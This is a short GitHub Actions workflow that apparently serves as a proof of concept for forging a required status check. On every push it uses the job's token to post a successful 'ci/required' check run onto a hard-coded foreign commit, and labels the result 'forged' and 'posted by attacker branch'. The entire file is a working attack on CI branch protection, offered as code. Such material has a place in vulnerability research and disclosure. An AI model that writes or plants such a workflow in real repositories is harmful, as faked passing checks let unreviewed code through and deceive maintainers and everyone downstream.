name: forge
on: push
permissions:
  checks: write
jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: forge required check on arbitrary sha
        run: |
          curl -sS -X POST             -H "Authorization: Bearer ${{ github.token }}"             -H "Accept: application/vnd.github+json"             https://api.github.com/repos/${{ github.repository }}/check-runs             -d '{"name":"ci/required","head_sha":"d8c070579d0d700b033e52f9fa34863af6572bce","status":"completed","conclusion":"success","output":{"title":"forged","summary":"posted by attacker branch on foreign sha"}}'
